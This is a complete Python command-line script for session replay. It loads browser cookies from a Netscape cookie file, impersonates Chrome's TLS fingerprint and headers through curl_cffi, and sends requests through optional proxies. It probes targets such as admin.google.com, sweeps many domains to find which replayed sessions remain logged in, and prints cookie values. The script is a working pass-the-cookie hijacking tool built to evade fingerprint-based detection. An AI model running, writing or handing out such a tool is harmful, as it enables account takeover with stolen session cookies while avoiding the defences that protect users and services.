#!/usr/bin/env python3
"""
session_replay.py — Cookie-based session replay with Chrome TLS fingerprint impersonation

Uses curl_cffi to mimic Chrome's JA3/JA3s/ALPN fingerprint exactly.
Reads Netscape-format cookie files and replays sessions against target URLs.

Usage:
  python3 session_replay.py probe --cookies cookies.txt --url https://admin.google.com/
  python3 session_replay.py enumerate --cookies cookies.txt --domains domains.txt --output results.json
  python3 session_replay.py export --cookies cookies.txt --domain .google.com
  python3 session_replay.py test-tls --url https://tls.browserleaks.com/tls
"""

import argparse
import json
import sys
import http.cookiejar
import time
from pathlib import Path
from urllib.parse import urlparse

try:
    from curl_cffi import requests as cffi_requests
except ImportError:
    print("[ERROR] curl_cffi not installed: pip install curl_cffi", file=sys.stderr)
    sys.exit(1)


CHROME_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-User": "?1",
    "Sec-Fetch-Dest": "document",
    "Sec-Ch-Ua": '"Chromium";v="126", "Google Chrome";v="126", "Not-A.Brand";v="8"',
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": '"macOS"',
    "Upgrade-Insecure-Requests": "1",
}


def load_cookies_netscape(path: str, filter_domain: str | None = None) -> dict:
    """Parse Netscape cookie file into {name: value} dict, optionally filtered."""
    cookies = {}
    with open(path) as f:
        for line in f:
            if line.startswith("#") or not line.strip():
                continue
            parts = line.strip().split("\t")
            if len(parts) < 7:
                continue
            domain, flag, cookie_path, secure, exp, name, value = parts
            if filter_domain and filter_domain not in domain:
                continue
            cookies[name] = value
    return cookies


def load_cookies_by_domain(path: str) -> dict:
    """Parse Netscape cookie file into {domain -> {name: value}} structure."""
    by_domain = {}
    with open(path) as f:
        for line in f:
            if line.startswith("#") or not line.strip():
                continue
            parts = line.strip().split("\t")
            if len(parts) < 7:
                continue
            domain, flag, cookie_path, secure, exp, name, value = parts
            by_domain.setdefault(domain, {})[name] = value
    return by_domain


def cookies_for_url(by_domain: dict, url: str) -> dict:
    """Extract cookies applicable to a URL (rough domain matching)."""
    parsed = urlparse(url)
    host = parsed.hostname or ""
    result = {}
    for domain, cookies in by_domain.items():
        d = domain.lstrip(".")
        if host == d or host.endswith("." + d):
            result.update(cookies)
    return result


def make_session(proxy: str | None = None, impersonate: str = "chrome120") -> cffi_requests.Session:
    s = cffi_requests.Session(impersonate=impersonate)
    if proxy:
        s.proxies = {"http": proxy, "https": proxy}
    return s


def cmd_probe(args):
    by_domain = load_cookies_by_domain(args.cookies)
    cookies = cookies_for_url(by_domain, args.url)
    impersonate = getattr(args, "impersonate", None) or args.__dict__.get("impersonate") or "chrome120"
    proxy = getattr(args, "proxy", None)
    print(f"[*] {len(cookies)} cookies for {args.url}")
    print(f"[*] Impersonating: {impersonate}")
    if proxy:
        print(f"[*] Proxy: {proxy}")

    s = make_session(proxy=proxy, impersonate=impersonate)
    resp = s.get(
        args.url,
        cookies=cookies,
        headers=CHROME_HEADERS,
        allow_redirects=True,
        timeout=20,
    )
    print(f"[+] Status: {resp.status_code}")
    print(f"[+] Final URL: {resp.url}")
    print(f"[+] Body: {len(resp.content)} bytes")

    if args.output:
        with open(args.output, "w") as f:
            f.write(resp.text)
        print(f"[+] Saved to {args.output}")
    else:
        # Print first 2KB
        print("\n--- RESPONSE (first 2KB) ---")
        text = resp.text
        print(text[:2048])


def cmd_enumerate(args):
    by_domain = load_cookies_by_domain(args.cookies)
    urls = []
    with open(args.domains) as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith("#"):
                if not line.startswith("http"):
                    line = "https://" + line
                urls.append(line)

    print(f"[*] Enumerating {len(urls)} targets with Chrome TLS impersonation")
    if args.proxy:
        print(f"[*] Proxy: {args.proxy}")

    s = make_session(proxy=args.proxy, impersonate=args.impersonate)
    results = []
    for url in urls:
        cookies = cookies_for_url(by_domain, url)
        try:
            resp = s.get(
                url,
                cookies=cookies,
                headers=CHROME_HEADERS,
                allow_redirects=True,
                timeout=15,
            )
            final_url = str(resp.url)
            authed = (
                final_url == url or
                urlparse(final_url).netloc == urlparse(url).netloc
            )
            result = {
                "url": url,
                "status": resp.status_code,
                "final_url": final_url,
                "cookies_sent": len(cookies),
                "body_size": len(resp.content),
                "auth_maintained": authed,
            }
            status = "[+]" if authed else "[ ]"
            print(f"  {status} {resp.status_code} {url} -> {final_url[:80]}")
        except Exception as e:
            result = {"url": url, "error": str(e)}
            print(f"  [!] {url}: {e}")
        results.append(result)

    if args.output:
        with open(args.output, "w") as f:
            json.dump(results, f, indent=2)
        print(f"\n[+] Results: {args.output}")
    else:
        authed_count = sum(1 for r in results if r.get("auth_maintained"))
        print(f"\n[+] Authenticated sessions: {authed_count}/{len(results)}")


def cmd_export(args):
    """Export cookies for a specific domain from the cookie file."""
    by_domain = load_cookies_by_domain(args.cookies)
    domain = args.domain
    cookies = {}
    for d, c in by_domain.items():
        if domain in d:
            cookies.update(c)
    print(f"# Cookies for {domain} ({len(cookies)} total)")
    for name, value in cookies.items():
        print(f"{name}={value[:60]}{'...' if len(value) > 60 else ''}")


def cmd_test_tls(args):
    """Hit a TLS fingerprint inspection endpoint and show our JA3."""
    print(f"[*] Testing TLS fingerprint at {args.url}")
    print(f"[*] Impersonating: {args.impersonate}")
    s = make_session(proxy=args.proxy if hasattr(args, 'proxy') else None, impersonate=args.impersonate)
    resp = s.get(args.url, headers=CHROME_HEADERS, timeout=15)
    print(f"[+] Status: {resp.status_code}")
    print(resp.text[:2000])


def main():
    parser = argparse.ArgumentParser(description="Session replay with Chrome TLS impersonation")
    parser.add_argument("--impersonate", default="chrome120",
                        help="TLS impersonation target (chrome120, chrome110, safari17, etc.)")
    parser.add_argument("--proxy", default=None,
                        help="Proxy URL (e.g. socks5://localhost:1080 or http://user:pass@host:port)")
    sub = parser.add_subparsers(dest="cmd")

    def _add_common(sub_parser):
        sub_parser.add_argument("--impersonate", default=None,
                                help="TLS fingerprint override for this subcommand")
        sub_parser.add_argument("--proxy", default=None,
                                help="Proxy URL override for this subcommand")

    p = sub.add_parser("probe", help="Probe a single URL with session cookies")
    p.add_argument("--cookies", required=True, help="Netscape cookie file")
    p.add_argument("--url", required=True, help="Target URL")
    p.add_argument("--output", help="Save response body to file")
    _add_common(p)

    e = sub.add_parser("enumerate", help="Enumerate multiple targets")
    e.add_argument("--cookies", required=True, help="Netscape cookie file")
    e.add_argument("--domains", required=True, help="File with one URL/domain per line")
    e.add_argument("--output", help="JSON results output file")
    _add_common(e)

    x = sub.add_parser("export", help="Export cookies for a domain")
    x.add_argument("--cookies", required=True, help="Netscape cookie file")
    x.add_argument("--domain", required=True, help="Domain to filter (e.g. .google.com)")
    _add_common(x)

    t = sub.add_parser("test-tls", help="Check our TLS fingerprint")
    t.add_argument("--url", default="https://tls.browserleaks.com/tls",
                   help="TLS inspection endpoint")
    _add_common(t)

    args = parser.parse_args()
    if not args.cmd:
        parser.print_help()
        return

    dispatch = {
        "probe": cmd_probe,
        "enumerate": cmd_enumerate,
        "export": cmd_export,
        "test-tls": cmd_test_tls,
    }
    dispatch[args.cmd](args)


if __name__ == "__main__":
    main()
